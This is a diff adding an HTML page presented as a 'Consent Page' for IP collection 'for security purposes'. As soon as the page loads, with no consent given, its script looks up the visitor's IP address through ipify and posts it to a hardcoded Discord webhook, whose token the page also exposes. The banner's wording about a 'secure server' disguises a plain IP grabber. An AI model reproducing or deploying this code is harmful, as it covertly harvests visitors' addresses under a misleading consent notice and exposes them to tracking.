@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consent Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            text-align: center;
+        }
+        #consent-banner {
+            background-color: #f8d7da;
+            padding: 10px;
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            display: inline-block;
+        }
+    </style>
+</head>
+<body>
+    <div id="consent-banner">
+        <p>By using this website, you consent to the collection of your IP address for security purposes. The IP address will be sent to a secure server. For more information, please refer to our privacy policy.</p>
+    </div>
+
+    <script>
+        // Function to get the user's IP address
+        async function getUserIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
+
+        // Function to send the IP address to the Discord webhook
+        async function sendIPToWebhook(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1282983823314911273/Y5LlHH7GI6GzWz4AmalE4wWQWkxzWnscHIDAzWTCj8RVpU5QZ4roOkVgphFceQ5ennbY';
+            const payload = {
+                content: `Ip of the user: ${ip}`
+            };
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        // Execute the functions
+        getUserIP().then(ip => sendIPToWebhook(ip)).catch(err => console.error(err));
+    </script>
+</body>
+</html>
